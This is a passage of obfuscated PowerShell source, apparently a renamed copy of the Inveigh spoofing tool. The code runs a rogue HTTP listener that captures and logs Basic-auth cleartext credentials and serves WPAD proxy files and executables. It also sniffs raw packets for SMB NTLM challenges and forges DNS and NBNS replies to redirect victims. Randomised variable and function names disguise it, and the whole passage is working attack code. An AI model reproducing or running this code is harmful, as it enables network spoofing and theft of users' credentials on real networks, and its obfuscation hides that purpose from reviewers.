                    $hiQfnsaO99 = $true
                    $pyGKsWFU99 = $null
                    if($LIbSoyXf99)
                    {
                        
                        if($SvQlrCWB99 -or $uzYCVpkd99)
                        {
                            $epBYCgxh99 = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            $CsiCXeez99 = $false
                        }
                    }
                }
                else
                {
                    $hiQfnsaO99 = $true
                }
            }
            elseif($fukYiaDq99.StartsWith('Negotiate '))
            {
                $TVMOxybY99 = 0x32,0x30,0x30
                $ZhpswcZT99 = 0x4f,0x4b
                $hiQfnsaO99 = $true
                $fukYiaDq99 = $fukYiaDq99 -replace 'Negotiate ',''
                [Byte[]]$qKIypXbm99 = [System.Convert]::FromBase64String($fukYiaDq99)
                $OklrZDTy99 = [System.BitConverter]::ToString($qKIypXbm99)
                $OklrZDTy99 = $OklrZDTy99 -replace "-",""
                $aNkdmJWL99 = $OklrZDTy99.IndexOf("2A864886F7120102020100")
                if($aNkdmJWL99 -gt 0)
                {
                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) authentication method is Kerberos for $keypOdIH99`:$ITbNpVlc99") > $null
                    if($YQiNABub99 -eq 'Y')
                    {
                        $LdHFmgtZ99 = $false
                        saddles $qKIypXbm99 $EbBOudFK99 $vgfsCcxE99 $uuWWIRDe99 "$keypOdIH99`:$ITbNpVlc99"
                    }
                }
                
            }
            elseif($fukYiaDq99.Startswith('Basic '))
            {
                $TVMOxybY99 = 0x32,0x30,0x30
                $ZhpswcZT99 = 0x4f,0x4b
                $fukYiaDq99 = $fukYiaDq99 -replace 'Basic ',''
                $hXrxFRbS99 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fukYiaDq99))
                $hiQfnsaO99 = $true
                $wzCNZfgp99.cleartext_file_queue.Add($hXrxFRbS99) > $null
                $wzCNZfgp99.cleartext_list.Add($hXrxFRbS99) > $null
                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) Basic authentication cleartext credentials captured from $keypOdIH99`:$ITbNpVlc99`:") > $null
                $wzCNZfgp99.output_queue.Add($hXrxFRbS99) > $null
                if($wzCNZfgp99.file_output)
                {
                    $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $vgfsCcxE99($uuWWIRDe99) Basic authentication cleartext credentials written to " + "Inveigh-Cleartext.txt") > $null
                }
                 
            }
            if(($xiYsInvL99 -notmatch '/wpad.dat' -and $mQkdAcSO99 -eq 'Anonymous') -or ($xiYsInvL99 -match '/wpad.dat' -and $cWbsxIoQ99 -eq 'Anonymous') -or (
            $GvqEXUZu99.Count -gt 0 -and $cWbsxIoQ99 -like 'NTLM*' -and ($GvqEXUZu99 | Where-Object {$iPQQkagw99 -match $_})) -or $hiQfnsaO99)
            {
                if($uzYCVpkd99 -and $DYCiYqcl99 -and $xiYsInvL99 -like '*.exe' -and (Test-Path (Join-Path $uzYCVpkd99 $DYCiYqcl99)) -and !(Test-Path (Join-Path $uzYCVpkd99 $xiYsInvL99)))
                {
                    [Byte[]]$CrepSCOb99 = [System.IO.File]::ReadAllBytes((Join-Path $uzYCVpkd99 $DYCiYqcl99))
                    $qTSaxVDF99 = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/exe")
                }
                elseif($uzYCVpkd99)
                {
                    if($OHQVRNnZ99 -and !(Test-Path (Join-Path $uzYCVpkd99 $xiYsInvL99)) -and (Test-Path (Join-Path $uzYCVpkd99 $OHQVRNnZ99)) -and $xiYsInvL99 -notmatch '/wpad.dat')
                    {
                        [Byte[]]$CrepSCOb99 = [System.IO.File]::ReadAllBytes((Join-Path $uzYCVpkd99 $OHQVRNnZ99))
                    }
                    elseif(($OHQVRNnZ99 -and $xiYsInvL99 -eq '' -or $OHQVRNnZ99 -and $xiYsInvL99 -eq '/') -and (Test-Path (Join-Path $uzYCVpkd99 $OHQVRNnZ99)))
                    {
                        [Byte[]]$CrepSCOb99 = [System.IO.File]::ReadAllBytes((Join-Path $uzYCVpkd99 $OHQVRNnZ99))
                    }
                    elseif($mooPFzLL99 -and $xiYsInvL99 -match '/wpad.dat')
                    {
                        [Byte[]]$CrepSCOb99 = [System.Text.Encoding]::UTF8.GetBytes($mooPFzLL99)
                        $qTSaxVDF99 = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig")
                    }
                    else
                    {
                        if(Test-Path (Join-Path $uzYCVpkd99 $xiYsInvL99))
                        {
                            [Byte[]]$CrepSCOb99 = [System.IO.File]::ReadAllBytes((Join-Path $uzYCVpkd99 $xiYsInvL99))
                        }
                        else
                        {
                            [Byte[]]$CrepSCOb99 = [System.Text.Encoding]::UTF8.GetBytes($SvQlrCWB99)
                        }
            
                    }
                }
                else
                {
                
                    if($mooPFzLL99 -and $xiYsInvL99 -match '/wpad.dat' -and (!$xZwnRmnl99 -or !($xZwnRmnl99 | Where-Object {$iPQQkagw99 -match $_})))
                    {
                        $qNxbZRoh99 = $mooPFzLL99
                        $qTSaxVDF99 = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig")
                    }
                    elseif($SvQlrCWB99)
                    {
                        $qNxbZRoh99 = $SvQlrCWB99
                        
                        if($nKkxBvGh99)
                        {
                            $qTSaxVDF99 = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: $nKkxBvGh99")
                        }
                    }
                    [Byte[]]$CrepSCOb99 = [System.Text.Encoding]::UTF8.GetBytes($qNxbZRoh99)
                }
            }
            else
            {
                [Byte[]]$CrepSCOb99 = [System.Text.Encoding]::UTF8.GetBytes($qNxbZRoh99)
            }
            $SUMzjKyK99 = Get-Date -format r
            $SUMzjKyK99 = [System.Text.Encoding]::UTF8.GetBytes($SUMzjKyK99)
            if(($mQkdAcSO99 -like 'NTLM*' -and $xiYsInvL99 -notmatch '/wpad.dat') -or ($cWbsxIoQ99 -like 'NTLM*' -and $xiYsInvL99 -match '/wpad.dat') -and !$hiQfnsaO99)
            {
                if($YQiNABub99 -eq 'Y' -and ($kvoRCffi99.Count -gt 0 -and $kvoRCffi99 -contains $umyMlKuv99))
                {
                    $CtKzWvDn99 = [System.Text.Encoding]::UTF8.GetBytes("Negotiate")
                }
                else
                {
                    $CtKzWvDn99 = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
                }
                
            }
            elseif(($mQkdAcSO99 -eq 'Basic' -and $xiYsInvL99 -notmatch '/wpad.dat') -or ($cWbsxIoQ99 -eq 'Basic' -and $xiYsInvL99 -match '/wpad.dat'))
            {
                $CtKzWvDn99 = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$ronDUKWy99")
            }
            
            $zLXnxgyF99 = New-Object System.Collections.Specialized.OrderedDictionary
            $zLXnxgyF99.Add("HTTPResponse_ResponseVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            $zLXnxgyF99.Add("HTTPResponse_StatusCode",$TVMOxybY99 + [Byte[]](0x20))
            $zLXnxgyF99.Add("HTTPResponse_ResponsePhrase",$ZhpswcZT99 + [Byte[]](0x0d,0x0a))
            if($LdHFmgtZ99)
            {
                $XCieNmhU99 = [System.Text.Encoding]::UTF8.GetBytes("Connection: close")
                $zLXnxgyF99.Add("HTTPResponse_Connection",$XCieNmhU99 + [Byte[]](0x0d,0x0a))
            }
            $zLXnxgyF99.Add("HTTPResponse_Server",[System.Text.Encoding]::UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0") + [Byte[]](0x0d,0x0a))
            $zLXnxgyF99.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $SUMzjKyK99 + [Byte[]](0x0d,0x0a))
            $zLXnxgyF99.Add("HTTPResponse_ContentLength",[System.Text.Encoding]::UTF8.GetBytes("Content-Length: $($CrepSCOb99.Length)") + [Byte[]](0x0d,0x0a))
            if($MggddCTr99 -and $CtKzWvDn99)
            {
                $zLXnxgyF99.Add("HTTPResponse_AuthenticateHeader",$MggddCTr99 + $CtKzWvDn99 + [Byte[]](0x0d,0x0a))
            }
            if($qTSaxVDF99)
            {
                $zLXnxgyF99.Add("HTTPResponse_ContentType",$qTSaxVDF99 + [Byte[]](0x0d,0x0a))
            }
            if($epBYCgxh99)
            {
                $zLXnxgyF99.Add("HTTPResponse_CacheControl",$epBYCgxh99 + [Byte[]](0x0d,0x0a))
            }
            if($CsiCXeez99)
            {
                $zLXnxgyF99.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $CrepSCOb99)
                $AFRrCgWx99 = madrasahs $zLXnxgyF99
                $NjHSxTIK99.Write($AFRrCgWx99,0,$AFRrCgWx99.Length)
                $NjHSxTIK99.Flush()
            }
            Start-Sleep -m 10
            $fdkCHuYK99 = $xiYsInvL99
            if($hiQfnsaO99)
            {
                
                if($LIbSoyXf99)
                {
                    $GmJLCyzY99.Client.Close()
                }
                else
                {
                    $GmJLCyzY99.Close()
                }
            }
        }
        else
        {
            if($EKIDRUjb99 -eq $GmJLCyzY99.Client.Handle)
            {
                $imBrsQFF99++
            }
            else
            {
                $imBrsQFF99 = 0
            }
            if($LdHFmgtZ99 -or $imBrsQFF99 -gt 20)
            {
                
                $GmJLCyzY99.Close()
                $imBrsQFF99 = 0
            }
            else
            {
                Start-Sleep -m 100
            }
            
        }
    
    }
    $GmJLCyzY99.Close()
    $ccxdllPM99.Stop()
}
$wxLxOSAe99 = 
{
    param ($DNS,$JApKCTck99,$rosmaqHG99,$FpxqDLtp99,$IP,$YQiNABub99,$NkBYNNgQ99,$mPKrHuBF99,$rHCPryid99,$LLMNR,
            $IEFYrrrG99,$mDNS,$GSmWUQVj99,$VzyZNqnS99,$NBNS,$ZMtTESED99,$tPiDssiv99,$HHgEZHCn99,$Pcap,
            $CBlLlQgp99,$oCOyAgdf99,$SMB,$DzGorPak99,$aaGIoVaU99,$zwiuIZeM99,
            $SDnpWGxP99,$VBgThnPx99,$TureDGKs99,$eqnDzsgQ99,$xeByEGnv99,
            $kbfXrXcm99,$aqPCuNat99,$UlUbQxYF99)
    $SsaomMJA99 = $true
    $ssqUoKRg99 = New-Object System.Byte[] 4	
    $QLdxgrhI99 = New-Object System.Byte[] 4	
    $FHGOFqVS99 = New-Object System.Byte[] 65534
    $ssqUoKRg99[0] = 1
    $ssqUoKRg99[1-3] = 0
    $QLdxgrhI99[0] = 1
    $QLdxgrhI99[1-3] = 0
    $WJJlGyZz99 = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $WJJlGyZz99.SetSocketOption("IP","HeaderIncluded",$true)
    $WJJlGyZz99.ReceiveBufferSize = 65534
    if($YQiNABub99 -eq 'Y')
    {
        if($rHCPryid99)
        {
            $EbBOudFK99 = (&{for ($i = 0;$i -lt $rHCPryid99.Length;$i += 2){$rHCPryid99.SubString($i,2)}}) -join "-"
            $EbBOudFK99 = $EbBOudFK99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($mPKrHuBF99)
        {
            $EbBOudFK99 = itemization ($mPKrHuBF99.UserName).Trim("\") $mPKrHuBF99.Password
        }
    }
    try
    {
        $XVMYzfzU99 = New-Object System.Net.IPEndpoint([System.Net.IPAddress]"$IP",0)
    }
    catch
    {
        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
        $kRjlpgSh99 = $_.Exception.Message
        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        $SsaomMJA99 = $false
    }
    $WJJlGyZz99.Bind($XVMYzfzU99)
    $WJJlGyZz99.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$ssqUoKRg99,$QLdxgrhI99)
    $ADStqJkK99 = [System.BitConverter]::GetBytes($JApKCTck99)
    [Array]::Reverse($ADStqJkK99)
    $REHGJqqF99 = [System.BitConverter]::GetBytes($IEFYrrrG99)
    [Array]::Reverse($REHGJqqF99)
    $loalODgk99 = [System.BitConverter]::GetBytes($VzyZNqnS99)
    [Array]::Reverse($loalODgk99)
    $ckLOaHna99 = [System.BitConverter]::GetBytes($ZMtTESED99)
    [Array]::Reverse($ckLOaHna99)
    $DqXkBhBB99 = New-Object System.Collections.Generic.List[string]
    $FaziRwBu99 = New-Object System.Collections.Generic.List[string]
    if($eqnDzsgQ99)
    {    
        $vZVTKZqz99 = New-TimeSpan -Minutes $eqnDzsgQ99
        $iXTVNwdE99 = [System.Diagnostics.Stopwatch]::StartNew()
    }
    [Byte[]]$OosLTMFc99 = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +
        0xff,0x00,0x00,0x01,0x00,0x00,0x00
    if($Pcap -eq 'File')
    {
        $lLjksORe99 = $HHgEZHCn99 + "\Inveigh-Packets.pcap"
        $qJJKkCDT99 = [System.IO.File]::Exists($lLjksORe99)
        
        try
        {
            $yzewmZdX99 = New-Object System.IO.FileStream $lLjksORe99,'Append','Write','Read'
            if(!$qJJKkCDT99)
            {
                $yzewmZdX99.Write($OosLTMFc99,0,$OosLTMFc99.Count)
            }
        }
        catch
        {
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
            $Pcap = ''
        }
    }
    elseif($Pcap -eq 'Memory' -and !$wzCNZfgp99.pcap)
    {
        $wzCNZfgp99.pcap = New-Object System.Collections.ArrayList
        $wzCNZfgp99.pcap.AddRange($OosLTMFc99)
    }
    while($wzCNZfgp99.running -and $SsaomMJA99)
    {
        $fefCbMud99 = $WJJlGyZz99.Receive($FHGOFqVS99,0,$FHGOFqVS99.Length,[System.Net.Sockets.SocketFlags]::None)
        $RGbImpca99 = New-Object System.IO.MemoryStream($FHGOFqVS99,0,$fefCbMud99)
        $bqmsYdQw99 = New-Object System.IO.BinaryReader($RGbImpca99)
        $fqIMLemy99 = $bqmsYdQw99.ReadByte()
        $bqmsYdQw99.ReadByte() > $null
        $uNIYuIkc99 = Convert-DataToUInt16 $bqmsYdQw99.ReadBytes(2)
        $bqmsYdQw99.ReadBytes(5) > $null
        $gPuWECqs99 = $bqmsYdQw99.ReadByte()
        $bqmsYdQw99.ReadBytes(2) > $null
        $nbRxsyOP99 = $bqmsYdQw99.ReadBytes(4)
        $vngeYplM99 = [System.Net.IPAddress]$nbRxsyOP99
        $LOTLNmug99 = $bqmsYdQw99.ReadBytes(4)
        $bynIJRfn99 = [System.Net.IPAddress]$LOTLNmug99
        $gUpgkuFg99 = [Int]"0x$(('{0:X}' -f $fqIMLemy99)[1])" * 4
        
        switch($gPuWECqs99)
        {
            
            6 
            {  # TCP
                $awjzSvYo99 = Convert-DataToUInt16 $bqmsYdQw99.ReadBytes(2)
                $uODFsrcg99 = Convert-DataToUInt16 $bqmsYdQw99.ReadBytes(2)
                $bqmsYdQw99.ReadBytes(8) > $null
                $VjPwyGjZ99 = [Int]"0x$(('{0:X}' -f $bqmsYdQw99.ReadByte())[0])" * 4
                $BPvshKfP99 = $bqmsYdQw99.ReadByte()
                $bqmsYdQw99.ReadBytes($VjPwyGjZ99 - 14) > $null
                $CpHYlqmn99 = $bqmsYdQw99.ReadBytes($fefCbMud99)
                $BPvshKfP99 = ([convert]::ToString($BPvshKfP99,2)).PadLeft(8,"0")
                if($BPvshKfP99.SubString(6,1) -eq "1" -and $BPvshKfP99.SubString(3,1) -eq "0" -and $bynIJRfn99 -eq $IP)
                {
                    $KahPgWEl99 = "$vngeYplM99`:$awjzSvYo99"
                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] TCP($uODFsrcg99) SYN packet detected from $KahPgWEl99") > $null
                }
                switch ($uODFsrcg99)
                {
                    139 
                    {
                        if($CpHYlqmn99)
                        {
                            excise $CpHYlqmn99 $IP $vngeYplM99 $bynIJRfn99 $awjzSvYo99 "139"
                        }
                        if($wzCNZfgp99.SMB_session_table.ContainsKey("$vngeYplM99`:$awjzSvYo99"))
                        {
                            chrysalises $CpHYlqmn99 $SMB $vngeYplM99 $awjzSvYo99 139 "SMB"
                        }
                    }
                    445
                    {
                        if($rgaFuzdx99.Count -lt $zKdTdMRc99 -and "$vngeYplM99`:$awjzSvYo99" -eq $HkoMBXDP99)
                        {
                            $rgaFuzdx99 += $CpHYlqmn99
                            if($rgaFuzdx99.Count -ge $zKdTdMRc99)
                            {
                                saddles $rgaFuzdx99 $EbBOudFK99 "SMB" 445 "$vngeYplM99`:$awjzSvYo99"
                                $zKdTdMRc99 = $null
                                $rgaFuzdx99 = $null
                                $HkoMBXDP99 = $null
                            }
                        }
                        if($CpHYlqmn99)
                        {   
                            $RCzqmnpF99 = excise $CpHYlqmn99 $IP $vngeYplM99 $bynIJRfn99 $awjzSvYo99 "445"
                            $zKdTdMRc99 = $RCzqmnpF99[0]
                            $rgaFuzdx99 = $RCzqmnpF99[1]
                            $HkoMBXDP99 = "$vngeYplM99`:$awjzSvYo99"
                        }
                        if($wzCNZfgp99.SMB_session_table.ContainsKey("$vngeYplM99`:$awjzSvYo99"))
                        {
                            chrysalises $CpHYlqmn99 $SMB $vngeYplM99 $awjzSvYo99 445 "SMB"
                        }
                    
                    }
                }
                switch ($awjzSvYo99)
                {
                    139 
                    {
                        if($CpHYlqmn99)
                        {
                            $pyGKsWFU99 = deadlocking $CpHYlqmn99
                        }
                        if($pyGKsWFU99 -and $bynIJRfn99 -ne $vngeYplM99)
                        {
                            if($vngeYplM99 -eq $IP)
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $pyGKsWFU99 sent to $bynIJRfn99`:$uODFsrcg99") > $null
                            }
                            else
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $pyGKsWFU99 received from $bynIJRfn99`:$uODFsrcg99") > $null
                            }
                            $wzCNZfgp99.SMB_session_table."$bynIJRfn99`:$uODFsrcg99" = $pyGKsWFU99
                            $pyGKsWFU99 = $null
                        }
                    
                    }
                    445
                    {
                        if($CpHYlqmn99)
                        {
                            $pyGKsWFU99 = deadlocking $CpHYlqmn99
                        }
                        if($pyGKsWFU99 -and $bynIJRfn99 -ne $vngeYplM99)
                        {
                            if($vngeYplM99 -eq $IP)
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $pyGKsWFU99 sent to $bynIJRfn99`:$uODFsrcg99") > $null
                            }
                            else
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $pyGKsWFU99 received from $bynIJRfn99`:$uODFsrcg99") > $null
                            }
                            $wzCNZfgp99.SMB_session_table."$bynIJRfn99`:$uODFsrcg99" = $pyGKsWFU99                      
                            $pyGKsWFU99 = $null
                        }
                        
                    
                    }
                
                }
                if($Pcap -and ($CBlLlQgp99 -contains $awjzSvYo99 -or $CBlLlQgp99 -contains $uODFsrcg99 -or $CBlLlQgp99 -contains 'All'))
                {
                    if($CpHYlqmn99)
                    {
                        $puwDMmGc99 = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
                        $hKchrJLY99 = [System.BitConverter]::GetBytes($fefCbMud99 + 14)
                        
                        $cUsSZjax99 = [System.BitConverter]::GetBytes([Int][Math]::Truncate($puwDMmGc99.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes($puwDMmGc99.Milliseconds) + # should be microseconds but probably doesn't matter
                            $hKchrJLY99 +
                            $hKchrJLY99 +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            $FHGOFqVS99[0..($fefCbMud99 - 1)]
                        if($cUsSZjax99.Count -eq ($fefCbMud99 + 30))
                        {
                            switch ($Pcap)
                            {
                                'File'
                                {
                                    try
                                    {
                                        $yzewmZdX99.Write($cUsSZjax99,0,$cUsSZjax99.Count)    
                                    }
                                    catch
                                    {
                                        $kRjlpgSh99 = $_.Exception.Message
                                        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                                        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
                                    }
                                }
                                'Memory'
                                {
                                    $wzCNZfgp99.pcap.AddRange($cUsSZjax99) 
                                }
                            }
                            
                        }
                    }
                }
            }
                
            17 
            {  # UDP
                $awjzSvYo99 = $bqmsYdQw99.ReadBytes(2)
                $fPpLZpwz99 = Convert-DataToUInt16 ($awjzSvYo99)
                $uODFsrcg99 = Convert-DataToUInt16 $bqmsYdQw99.ReadBytes(2)
                $MeDESEel99 = $bqmsYdQw99.ReadBytes(2)
                $pPawbVUx99  = Convert-DataToUInt16 ($MeDESEel99)
                $bqmsYdQw99.ReadBytes(2) > $null
                $CpHYlqmn99 = $bqmsYdQw99.ReadBytes(($pPawbVUx99 - 2) * 4)
                switch($uODFsrcg99)
                {
                    53 # DNS
                    {
                        $WTJYQyju99 = Get-NameQueryString 12 $CpHYlqmn99
                        $NQNxeGVY99 = $CpHYlqmn99[12..($WTJYQyju99.Length + 13)]
                        [Byte[]]$MeDESEel99 = ([System.BitConverter]::GetBytes($NQNxeGVY99.Count + $NQNxeGVY99.Count + $zwiuIZeM99.Length + 23))[1,0]
                        $xLtCtGDR99 = "[+]"
                        $NQNxeGVY99 += 0x00,0x01,0x00,0x01 +
                                                $NQNxeGVY99 +
                                                0x00,0x01,0x00,0x01 +
                                                $ADStqJkK99 +
                                                0x00,0x04 +
                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
        
                        $sqYKzues99 = 0x00,0x35 +
                                                    $awjzSvYo99[1,0] +
                                                    $MeDESEel99 +
                                                    0x00,0x00 +
                                                    $CpHYlqmn99[0,1] +
                                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $NQNxeGVY99
                        $LPiceXcR99 = appraisers -SfjCtTyl99 $WTJYQyju99 -Type "DNS" -HEKGWWAq99 $DNS
                        $xLtCtGDR99 = $LPiceXcR99[0]
                        $LPiceXcR99 = $LPiceXcR99[1]
                        if($LPiceXcR99 -eq '[response sent]')
                        {
                            $TMmcGbkJ99 = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                            $TMmcGbkJ99.SendBufferSize = 1024
                            $WfHatuuO99 = New-Object System.Net.IPEndpoint($vngeYplM99,$fPpLZpwz99) 
                            $TMmcGbkJ99.SendTo($sqYKzues99,$WfHatuuO99) > $null
                            $TMmcGbkJ99.Close()
                        }
                        if($bynIJRfn99 -eq $IP)
                        {
                            $wzCNZfgp99.output_queue.Add("$xLtCtGDR99 [$(Get-Date -format s)] DNS request for $WTJYQyju99 received from $vngeYplM99 $LPiceXcR99") > $null
                        }
                        else
                        {
                            $wzCNZfgp99.output_queue.Add("$xLtCtGDR99 [$(Get-Date -format s)] DNS request for $WTJYQyju99 sent to $bynIJRfn99 [outgoing query]") > $null
                        }
                    }
                    137 # NBNS
                    {
                     
                        if(([System.BitConverter]::ToString($CpHYlqmn99[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($CpHYlqmn99[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($CpHYlqmn99[10..11]) -ne '00-01')
                        {
                            if([System.BitConverter]::ToString($CpHYlqmn99[4..7]) -eq '00-01-00-00')
                            {
                                $MeDESEel99[0] += 12
                                $OUuiALWw99 = "[+]"
                            
                                $lHYFBEEB99 = $CpHYlqmn99[13..$CpHYlqmn99.Length] +
                                                        $ckLOaHna99 +
                                                        0x00,0x06,0x00,0x00 +
                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
                    
                                $xCQaEZvg99 = 0x00,0x89 +
                                                        $awjzSvYo99[1,0] +
                                                        $MeDESEel99[1,0] +
                                                        0x00,0x00 +
                                                        $CpHYlqmn99[0,1] +
                                                        0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                        $lHYFBEEB99
                    
                                $DPpOatzL99 = [System.BitConverter]::ToString($CpHYlqmn99[43..44])
                                $DPpOatzL99 = Get-NBNSQueryType $DPpOatzL99
                                $kYZXlJtB99 = $CpHYlqmn99[47]
                                $usieQmFL99 = [System.BitConverter]::ToString($CpHYlqmn99[13..($CpHYlqmn99.Length - 4)])
                                $usieQmFL99 = $usieQmFL99 -replace "-00",""
                                $usieQmFL99 = $usieQmFL99.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $jNMDQmxr99 = New-Object System.String ($usieQmFL99,0,$usieQmFL99.Length)
                                $XqkoLgDn99 = $jNMDQmxr99
                                $jNMDQmxr99 = $jNMDQmxr99.Substring(0,$jNMDQmxr99.IndexOf("CA"))                
                                $kyzxACOa99 = $null
                                $JdxmtGsw99 = $null
                                $n = 0
                                
                                do
                                {
                                    $DaNDhVwp99 = (([Byte][Char]($jNMDQmxr99.Substring($n,1))) - 65)
                                    $kyzxACOa99 += ([System.Convert]::ToString($DaNDhVwp99,16))
                                    $n++
                                }
                                until($n -ge ($jNMDQmxr99.Length))
                        
                                $n = 0
                        
                                do
                                {
                                    $JdxmtGsw99 += ([Char]([System.Convert]::ToInt16($kyzxACOa99.Substring($n,2),16)))
                                    $n += 2
                                }
                                until($n -ge ($kyzxACOa99.Length) -or $JdxmtGsw99.Length -eq 15)
                                if($XqkoLgDn99.StartsWith("ABAC") -and $XqkoLgDn99.EndsWith("ACAB"))
                                {
                                    $JdxmtGsw99 = $JdxmtGsw99.Substring(2)
                                    $JdxmtGsw99 = $JdxmtGsw99.Substring(0, $JdxmtGsw99.Length - 1)
                                    $JdxmtGsw99 = "<01><02>" + $JdxmtGsw99 + "<02>"
                                }
                                if($JdxmtGsw99 -notmatch '[^\x00-\x7F]+')
                                {
                                    if(!$wzCNZfgp99.request_table.ContainsKey($JdxmtGsw99))
                                    {
                                        $wzCNZfgp99.request_table.Add($JdxmtGsw99.ToLower(),[Array]$vngeYplM99.IPAddressToString)
                                        $wzCNZfgp99.request_table_updated = $true
                                    }
                                    else
                                    {
                                        $wzCNZfgp99.request_table.$JdxmtGsw99 += $vngeYplM99.IPAddressToString
                                        $wzCNZfgp99.request_table_updated = $true
                                    }
                                }
                                $pLGYzDEG99 = $false
                            }
                            if($TureDGKs99 -eq 'Y' -and $wzCNZfgp99.valid_host_list -notcontains $JdxmtGsw99 -and [System.BitConverter]::ToString($CpHYlqmn99[4..7]) -eq '00-01-00-00' -and $vngeYplM99 -ne $IP)
                            {
                            
                                if(($FaziRwBu99.Exists({param($s) $s -like "20* $JdxmtGsw99"})))
                                {
                                    $DouGOgKB99 = [DateTime]$FaziRwBu99.Find({param($s) $s -like "20* $JdxmtGsw99"}).SubString(0,19)
                                    if((Get-Date) -ge $DouGOgKB99.AddMinutes($xeByEGnv99))
                                    {
                                        $FaziRwBu99.RemoveAt($FaziRwBu99.FindIndex({param($s) $s -like "20* $JdxmtGsw99"}))
                                        $RSKkfNza99 = $true
                                    }
                                    else
                                    {
                                        $RSKkfNza99 = $false
                                    }
                                }
                                else
                                {           
                                    $RSKkfNza99 = $true
                                }
                                if($RSKkfNza99)
                                {
                                    $mrVDnLHm99 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -fkkZmGkZ99 1 -iRDzftBy99 255)})
                                    $ArjkigHi99 = $mrVDnLHm99.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $mrVDnLHm99 = $mrVDnLHm99 -replace " ","-"
                                    $pjtZHdCg99 = New-Object System.Net.Sockets.UdpClient 137
                                    $pYkxipEs99 = $CpHYlqmn99[13..($CpHYlqmn99.Length - 5)]
                                    $pjlQkLhA99 = $ArjkigHi99 +
                                                            0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                            $pYkxipEs99 +
                                                            0x00,0x20,0x00,0x01
                                    $IkfIflfp99 = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
                                    $pjtZHdCg99.Connect($IkfIflfp99)
                                    $pjtZHdCg99.Send($pjlQkLhA99,$pjlQkLhA99.Length)
                                    $pjtZHdCg99.Close()
                                    $FaziRwBu99.Add("$(Get-Date -format s) $mrVDnLHm99 $JdxmtGsw99") > $null
                                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $JdxmtGsw99 sent to " + $IkfIflfp99.Address.IPAddressToString) > $null
                                }
                            }
                            $fLrgSLWG99 = appraisers -SfjCtTyl99 $JdxmtGsw99 -Type "NBNS" -HEKGWWAq99 $NBNS -LhUjVByd99 $kYZXlJtB99
                            $OUuiALWw99 = $fLrgSLWG99[0]
                            $fLrgSLWG99 = $fLrgSLWG99[1]
                            if($fLrgSLWG99 -eq '[response sent]')
                            {
